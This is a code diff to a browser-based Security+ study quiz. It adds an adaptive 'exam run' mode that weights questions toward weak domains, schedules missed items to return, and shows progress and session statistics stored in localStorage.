     const st = document.createElement("div"); st.className = "rdstat" + (r.ready ? " go" : "");
     const weak = Object.keys(DOMAINS).filter(d => { const v = r.sum[d]; return v[1] < READY_MIN || v[0] / v[1] * 100 < READY_PCT; });
     st.textContent = r.ready ? "> EXAM-READY: 85%+ in every domain over your last " + r.plays + " plays (weighted " + r.weighted + "%)"
-      : !r.plays ? "> no data yet: play Scenarios, Mixed or PBQ to build your readiness score"
+      : !r.plays ? "> no data yet: finish an exam run to build your readiness score"
       : "> NOT READY YET" + (r.weighted != null ? " (weighted " + r.weighted + "%)" : "") + " · work on domain " + weak.join(", ") + " (need 85%+ and " + READY_MIN + "+ answers each)";
     b.appendChild(st);
+    renderSession(b);
   });
+  renderRunInfo();
 }
+
+/* ---------- Exam Run: adaptive mix, spaced repeats, bank progress, session view ---------- */
+const RUN = "etlabs:study:run", RUN_SCEN = 26, RUN_PBQ = 4, MISS_GAP = 3;   // a miss returns on run k+3 (2 other runs in between)
+function loadRun(){ try{ return JSON.parse(localStorage.getItem(RUN)) || {}; }catch(e){ return {}; } }
+function saveRun(s){ if(isDemo()) return; try{ localStorage.setItem(RUN, JSON.stringify(s)); }catch(e){} }
+function noteResult(id, ok){
+  if(isDemo()) return; const st = loadRun(), k = itemKey(id); st.miss = st.miss || {};
+  if(ok) delete st.miss[k]; else st.miss[k] = (st.n || 0) + 1;   // run number this miss happened in
+  saveRun(st);
+}
+/* domain weights: w_d = W_d x (1 + max(0, 0.85 - acc_d)), normalized; floored at 0.5 x W_d, renormalized.
+   acc_d = readiness accuracy over the last 10 plays (no data = no boost). */
+function runWeights(){
+  const r = readiness(), W = {}, out = {}; let s = 0;
+  Object.keys(DOMAINS).forEach(d => { const v = r.sum[d], acc = v[1] ? v[0] / v[1] : READY_PCT / 100;
+    W[d] = WEIGHT[d] / 100 * (1 + Math.max(0, READY_PCT / 100 - acc)); s += W[d]; });
+  let t = 0; Object.keys(W).forEach(d => { out[d] = Math.max(W[d] / s, WEIGHT[d] / 100 * 0.5); t += out[d]; });
+  Object.keys(out).forEach(d => out[d] /= t);
+  return out;
+}
+function allot(n, w, cap){   // largest-remainder split of n slots by weight, respecting per-domain caps
+  const ks = Object.keys(w), res = {}; let left = n;
+  ks.forEach(d => { res[d] = Math.min(cap[d], Math.floor(n * w[d])); left -= res[d]; });
+  const rem = ks.slice().sort((a, b) => (n * w[b] % 1) - (n * w[a] % 1));
+  for(let g = 0; left > 0 && g < 50; g++) for(const d of rem){ if(left > 0 && res[d] < cap[d]){ res[d]++; left--; } }
+  return res;
+}
+function pickDomain(ids, n){
+  if(n <= 0) return [];
+  const st = loadRun(), now = (st.n || 0) + 1, miss = st.miss || {}, seen = loadSeen();
+  const key = id => itemKey(id);
+  const due = shuffle(ids.filter(id => miss[key(id)] != null && now - miss[key(id)] >= MISS_GAP));
+  const waiting = ids.filter(id => miss[key(id)] != null && now - miss[key(id)] < MISS_GAP);
+  let fresh = shuffle(ids.filter(id => miss[key(id)] == null && !seen[key(id)]));
+  const take = due.slice(0, Math.ceil(n / 3));
+  for(const id of fresh) if(take.length < n) take.push(id);
+  if(take.length < n){   // this domain's pool is used up: start a new cycle (correct answers become fresh again)
+    try{ ids.forEach(id => { if(miss[key(id)] == null) delete seen[key(id)]; }); localStorage.setItem(SEEN, JSON.stringify(seen)); }catch(e){}
+    const cyc = st.cyc || {}; const d = ids.length ? domOf(parseId(ids[0]).kind === "p" ? PBQ[parseId(ids[0]).i] : SCEN[parseId(ids[0]).i]) : "?";
+    cyc[d + parseId(ids[0] || "s:0").kind] = (cyc[d + parseId(ids[0] || "s:0").kind] || 1) + 1; st.cyc = cyc; saveRun(st);
+    for(const id of shuffle(ids)) if(take.length < n && take.indexOf(id) < 0 && waiting.indexOf(id) < 0) take.push(id);
+  }
+  for(const id of due) if(take.length < n && take.indexOf(id) < 0) take.push(id);
+  for(const id of waiting) if(take.length < n && take.indexOf(id) < 0) take.push(id);   // only if the domain has nothing else
+  return take;
+}
+function buildRun(){
+  const w = runWeights(), byD = {}, pbD = {};
+  Object.keys(DOMAINS).forEach(d => { byD[d] = []; pbD[d] = []; });
+  SCEN.forEach((s, i) => byD[domOf(s)].push("s:" + i)); PBQ.forEach((p, i) => pbD[domOf(p)].push("p:" + i));
+  const cs = {}, cp = {}; Object.keys(DOMAINS).forEach(d => { cs[d] = byD[d].length; cp[d] = pbD[d].length; });
+  const ns = allot(Math.min(RUN_SCEN, SCEN.length), w, cs), np = allot(Math.min(RUN_PBQ, PBQ.length), w, cp);
+  let ids = [];
+  Object.keys(DOMAINS).forEach(d => { ids = ids.concat(pickDomain(byD[d], ns[d]), pickDomain(pbD[d], np[d])); });
+  lastMix = { s: ns, p: np, w };
+  return shuffle(ids);
+}
+let lastMix = null;
+function bankProgress(){
+  const seen = loadSeen(), miss = loadRun().miss || {}, out = {};
+  Object.keys(DOMAINS).forEach(d => out[d] = [0, 0]);
+  SCEN.forEach((s, i) => { const d = domOf(s), k = itemKey("s:" + i); out[d][1]++; if(seen[k] || miss[k] != null) out[d][0]++; });
+  PBQ.forEach((p, i) => { const d = domOf(p), k = itemKey("p:" + i); out[d][1]++; if(seen[k] || miss[k] != null) out[d][0]++; });
+  return out;
+}
+const SPARK = "▁▂▃▄▅▆▇█";
+function renderSession(b){
+  const st = loadRun(), hist = st.hist || [], now = new Date();
+  const day0 = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
+  const fri = new Date(day0 - ((now.getDay() + 2) % 7) * 864e5).getTime();   // most recent Friday 00:00 local
+  const today = hist.filter(x => x.t >= day0), wk = hist.filter(x => x.t >= fri);
+  const mins = a => Math.round(a.reduce((n, x) => n + (x.sec || 0), 0) / 60);
+  const last = hist.slice(-12), spark = last.map(x => SPARK[Math.min(7, Math.floor((x.acc || 0) / 12.5))]).join("");
+  const rtr = hist.filter(x => x.r != null).slice(-6).map(x => x.r + "%").join(" → ");
+  const p = bankProgress(), w = runWeights(), miss = Object.keys(st.miss || {}).length;
+  const weakest = Object.keys(w).sort((a, c) => w[c] / WEIGHT[c] - w[a] / WEIGHT[a])[0];
+  const box = document.createElement("div"); box.className = "rdsess";
+  box.innerHTML = "<div class='rdh'>BANK PROGRESS (seen / total)</div>" +
+    Object.keys(DOMAINS).map(d => "<div class='rdrow'><span class='dn'>" + d + ".0 " + esc(DOMAINS[d]) + "</span><span class='bar'><i style='width:" + Math.round(p[d][0] / Math.max(1, p[d][1]) * 100) + "%;background:var(--cyan)'></i></span><span class='pc'>" + p[d][0] + "/" + p[d][1] + "</span></div>").join("") +
+    "<div class='rdh'>NEXT RUN FOCUS</div><div class='rdl'>" + Object.keys(w).map(d => "D" + d + " " + Math.round(w[d] * 100) + "%").join(" · ") +
+    (hist.length ? "<br>&gt; weakest: domain " + weakest + " (" + esc(DOMAINS[weakest]) + ")" : "") + "<br>&gt; missed questions waiting to come back: " + miss + "</div>" +
+    "<div class='rdh'>SESSION</div><div class='rdl'>today: " + today.length + " runs, " + mins(today) + " min · weekend (since Fri): " + wk.length + " runs, " + mins(wk) + " min · all time: " + (st.n || 0) + " runs" +
+    (spark ? "<br>&gt; last runs accuracy: <span class='spark'>" + spark + "</span> " + (last[last.length - 1].acc) + "%" : "") +
+    (rtr ? "<br>&gt; readiness trend: " + rtr : "") + "</div>";
+  b.appendChild(box);
+}
+function renderWeak(){
+  const uniq = [...new Set(missed)], byO = {};
+  uniq.forEach(id => { const it = parseId(id), x = it.kind === "p" ? PBQ[it.i] : it.kind === "s" ? SCEN[it.i] : null; if(x) byO[x.o] = (byO[x.o] || 0) + 1; });
+  const top = Object.entries(byO).sort((a, b) => b[1] - a[1]).slice(0, 6);
+  $("weakBody").innerHTML = top.length ? top.map(([o, n]) => "<div class='rdl'>&gt; " + o + " " + esc(OBJECTIVES[o] || "") + " <b style='color:var(--red)'>x" + n + "</b></div>").join("") : "<div class='rdl'>&gt; no misses this run</div>";
+  // term cards tied to the missed questions: same objective AND the term appears in the question/answer/why text
+  const ul = $("termReview"); ul.innerHTML = ""; const used = new Set();
+  uniq.forEach(id => { const it = parseId(id), x = it.kind === "p" ? PBQ[it.i] : it.kind === "s" ? SCEN[it.i] : null; if(!x) return;
+    const txt = (it.kind === "p" ? x.prompt + " " + x.exhibit + " " + x.items.map(y => y[1]).join(" ") + " " + x.why : x.q + " " + x.options[x._a] + " " + x.why + " " + (x.payload || "")).toLowerCase();
+    CARDS_ALL.forEach(c => { if(used.size >= 14 || used.has(c.term) || c.o !== x.o) return; const t = c.term.toLowerCase().replace(/\s*\(.*\)$/, "");
+      if(t.length >= 3 && txt.indexOf(t) >= 0){ used.add(c.term); const li = document.createElement("li"); li.innerHTML = "<b>" + esc(c.term) + "</b><span>" + esc(c.meaning) + "</span>"; ul.appendChild(li); } }); });
+  if(!used.size) ul.innerHTML = "<li class='none'>&gt; " + (uniq.length ? "no term cards match these misses" : "nothing to review") + "</li>";
+}
+function renderRunInfo(){
+  const el = $("runInfo"); if(!el) return; const st = loadRun();
+  el.textContent = "> 1 mode: EXAM RUN · " + RUN_SCEN + " scenarios + " + RUN_PBQ + " PBQs · 30s+ per question · weighted to your weak domains · run #" + ((st.n || 0) + 1);
+}
+
+/* wipe every study-game key on this device (seen pools, misses, readiness, analytics, settings, old leaderboard/nickname) */
+function clearProgress(){
+  if(!confirm("Clear all your Security+ study progress on this device? This can't be undone.")) return;
+  try{ Object.keys(localStorage).filter(k => /^(etlabs:study:|hackquiz:)/.test(k)).forEach(k => localStorage.removeItem(k)); }catch(e){}
+  location.reload();
+}
+$("bClear").onclick = () => { sfx.click(); clearProgress(); };
 
 /* ---------- end ---------- */
 function endGame(){
@@ -2461,9 +2480,7 @@ function endGame(){
   if(newHigh) highs[hk(runMode)] = score;
   bests[hk(runMode)] = Math.max(bests[hk(runMode)] || 0, bestStreak); persist();
   if(!review) markDone(settings.domain, runMode);
-  $("lb").style.display = runMode === "pbq" ? "none" : "";
-  if(runMode !== "pbq") renderBoard(settings.domain, runMode, !review && !isDemo());
-  if(!review) recordPlay(); renderReadiness();
+  if(!review) recordPlay(); renderReadiness(); renderWeak();
   $("newhs").style.display = newHigh ? "block" : "none";
   $("endHigh").textContent = "HIGH SCORE (" + domLabel(settings.domain) + " " + MODES[runMode] + ", full round): " + highs[hk(runMode)] + "  //  BEST STREAK: " + bests[hk(runMode)];
   const ul = $("missedList"); ul.innerHTML = "";
@@ -2482,7 +2499,7 @@ function endGame(){
   });
   $("bRetryMissed").style.display = uniq.length ? "block" : "none";
   $("bRetryMissed").dataset.ids = JSON.stringify(uniq);
-  $("bAgain").innerHTML = "&gt; New " + MODES[runMode].toLowerCase() + " round";
+  $("bAgain").innerHTML = "&gt; Next exam run";
   show("sEnd"); sfx.end();
   if(grade === "S" || grade === "A") setTimeout(confetti, 300);
 }
